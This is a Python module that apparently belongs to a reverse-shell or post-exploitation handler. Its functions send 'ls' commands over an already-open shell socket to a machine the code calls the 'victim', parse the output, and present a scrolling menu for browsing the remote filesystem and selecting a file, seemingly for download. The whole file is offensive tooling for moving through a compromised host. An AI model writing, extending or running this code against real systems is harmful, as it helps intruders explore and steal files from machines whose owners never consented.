import sys
import re
import time
import os

from ui.menu import scrolling_menu


def sock_read_until(shell_sock, marker, timeout=10):
    buf      = ""
    deadline = time.time() + timeout
    shell_sock.setblocking(False)
    try:
        while time.time() < deadline:
            try:
                data = shell_sock.recv(8192)
                if data:
                    buf += data.decode(errors='ignore')
                    clean = re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', buf)
                    clean = re.sub(r'\x1b\][^\x07]*\x07', '', clean)
                    clean = clean.replace('\r', '')
                    if marker in clean:
                        return clean
                else:
                    time.sleep(0.05)
            except BlockingIOError:
                time.sleep(0.05)
            except:
                break
    finally:
        shell_sock.setblocking(True)
    clean = re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', buf)
    return clean.replace('\r', '')


def sock_drain(shell_sock, timeout=0.8):
    shell_sock.setblocking(False)
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data = shell_sock.recv(4096)
            if not data:
                break
        except:
            break
        time.sleep(0.02)
    shell_sock.setblocking(True)


def get_victim_ls(shell_sock, remote_path):
    marker = f"GSMARK{int(time.time())}END"
    cmd    = f"ls -1ap {remote_path}; echo {marker}\n"
    shell_sock.sendall(cmd.encode())

    buf = sock_read_until(shell_sock, marker, timeout=10)
    sock_drain(shell_sock, timeout=0.5)

    entries   = []
    recording = False
    for line in buf.splitlines():
        s = line.strip()
        if not s:
            continue
        if 'ls -1ap' in s:
            recording = True
            continue
        if marker in s:
            break
        if not recording:
            continue
        if re.search(r'[\$\#]\s*$', s):
            continue
        if any(x in s for x in ('┌', '└', '╔', '╚', '─', '╼')):
            continue
        if s == './':
            continue
        is_dir = s.endswith('/')
        label  = f"\033[1;34m📁 {s}\033[0m" if is_dir else f"📄 {s}"
        entries.append((label, s, is_dir))

    return entries


def browse_victim(shell_sock, fd):
    cwd = "."

    while True:
        sock_drain(shell_sock, timeout=1.0)

        sys.stdout.write(
            f"\r\n  \033[1;36m[*]\033[0m Fetching listing of \033[1;33m{cwd}\033[0m...\r\n"
        )
        sys.stdout.flush()

        entries = get_victim_ls(shell_sock, cwd)

        if not entries:
            sys.stdout.write("  \033[1;31m[!]\033[0m Empty or unreadable directory.\r\n\r\n")
            sys.stdout.flush()
            if cwd != ".":
                cwd = os.path.normpath(os.path.join(cwd, ".."))
                continue
            return None, None

        labels = [e[0] for e in entries]
        choice = scrolling_menu(fd, f"Browse \033[1;33m{cwd}\033[0m", labels)

        if choice == -1:
            return None, None

        _, name, is_dir = entries[choice]

        if is_dir:
            if name == '../':
                if cwd != ".":
                    cwd = os.path.normpath(os.path.join(cwd, ".."))
            else:
                stripped = name.rstrip('/')
                cwd = stripped if cwd == "." else cwd + "/" + stripped
            continue

        remote_filepath = name if cwd == "." else cwd + "/" + name
        filename        = os.path.basename(remote_filepath)
        return remote_filepath, filename
